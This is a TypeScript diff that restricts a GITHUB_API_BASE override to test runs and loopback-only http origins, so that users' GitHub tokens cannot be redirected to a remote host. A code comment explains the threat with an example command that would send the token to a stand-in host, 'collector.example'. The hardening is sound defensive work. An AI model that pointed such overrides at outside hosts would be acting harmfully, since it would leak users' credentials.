@@ -26,7 +26,8 @@ export const getEnterpriseDomain = (): string | null => {
 }
 
 /**
- * `GITHUB_API_BASE` — a full origin that replaces **both** GitHub hosts.
+ * `GITHUB_API_BASE` — a **test-only, loopback-only** full origin that replaces
+ * **both** GitHub hosts.
  *
  * *What it means.* When set, it is the origin for the login/OAuth host
  * (normally `https://github.com`) **and** the API host (normally
@@ -46,30 +47,69 @@ export const getEnterpriseDomain = (): string | null => {
  * through it — no scheme control, no port. This override takes a full origin,
  * so it can express one.
  *
- * *Consequence that matters.* `send-request.ts` decides whether to attach the
- * GitHub credential by comparing the destination's origin against
- * `getGitHubApiBaseUrl()`. Because the override flows through that same
- * accessor, a request to the overridden host is still recognised as the GitHub
- * API host and still gets its token — the auth path does not silently go
- * anonymous when pointed at a fixture, which would make a test pass for the
- * wrong reason.
+ * *Consequence that matters, and the bound it forces (#133).*
+ * `send-request.ts` decides whether to attach the GitHub credential by
+ * comparing the destination's origin against `getGitHubApiBaseUrl()`. Because
+ * the override flows through that same accessor, a request to the overridden
+ * host is still recognised as the GitHub API host and still gets its token —
+ * the auth path does not silently go anonymous when pointed at a fixture,
+ * which would make a test pass for the wrong reason. That is the point, and it
+ * is also why an unbounded override is a credential-exfiltration primitive:
+ * `GITHUB_API_BASE=https://collector.example maximal start` would send the
+ * user's GitHub token to `collector.example`, which is precisely the "a caller
+ * cannot choose the credential destination" guarantee ADR-0001 exists to make.
  *
- * Precedence: this wins over `COPILOT_API_ENTERPRISE_URL`; it is the more
- * explicit of the two (a full origin, not a domain to be re-prefixed).
- * Anything that is not a parseable `http:`/`https:` URL is ignored, so a
- * typo'd value falls back to the default hosts rather than nulling out the
- * auth path. Only the origin is used; any path, query, or fragment is dropped.
+ * So the accepted set is the smallest one that still expresses the fixture:
+ *
+ *   1. `NODE_ENV === "test"`. A normal user process ignores the variable
+ *      outright, whatever it says.
+ *   2. `http:` — a loopback fixture has no reason to present TLS, and
+ *      accepting `https:` buys only the ability to name a remote-looking one.
+ *   3. A loopback **literal** host: `127.0.0.1`, or `[::1]` as WHATWG brackets
+ *      an IPv6 literal in `URL.hostname`. Not `localhost`, which is a name and
+ *      therefore resolver-dependent.
+ *   4. No userinfo, no query, no fragment, and no path beyond the root — each
+ *      of those either carries a credential or smuggles out-of-origin data
+ *      past a loopback-looking prefix.
+ *
+ * Every one of those still permits `http://127.0.0.1:<ephemeral port>` and
+ * `http://[::1]:<ephemeral port>`, which is the entire use case. None permits a
+ * remote origin to receive the token. Anything rejected — including a typo —
+ * falls back to the default hosts rather than nulling out the auth path.
+ *
+ * Precedence: an accepted value wins over `COPILOT_API_ENTERPRISE_URL`; it is
+ * the more explicit of the two (a full origin, not a domain to be re-prefixed).
+ * An accepted value is normalized to its origin.
+ *
+ * The failure mode this guards is silent — a too-wide override makes nothing
+ * observable go wrong locally, because by design the request succeeds and
+ * carries the credential — so `tests/github-api-base-override.test.ts` asserts
+ * each rejected shape by name.
  */
+const LOOPBACK_OVERRIDE_HOSTNAMES = new Set([
+  "127.0.0.1",
+  // `URL.hostname` brackets an IPv6 literal; the bare `::1` never appears here.
+  "[::1]",
+])
+
 const getGitHubApiBaseOverride = (): string | null => {
+  // Gate first: outside a test run the variable does not exist, so no shape of
+  // it can reach the origin comparison in `send-request.ts`.
+  if (process.env.NODE_ENV !== "test") return null
   const raw = (process.env.GITHUB_API_BASE ?? "").trim()
   if (!raw) return null
+  let parsed: URL
   try {
-    const parsed = new URL(raw)
-    if (parsed.protocol !== "http:" && parsed.protocol !== "https:") return null
-    return parsed.origin
+    parsed = new URL(raw)
   } catch {
     return null
   }
+  if (parsed.protocol !== "http:") return null
+  if (!LOOPBACK_OVERRIDE_HOSTNAMES.has(parsed.hostname)) return null
+  if (parsed.username !== "" || parsed.password !== "") return null
+  if (parsed.pathname !== "/") return null
+  if (parsed.search !== "" || parsed.hash !== "") return null
+  return parsed.origin
 }
 
 export const getGitHubBaseUrl = (): string => {
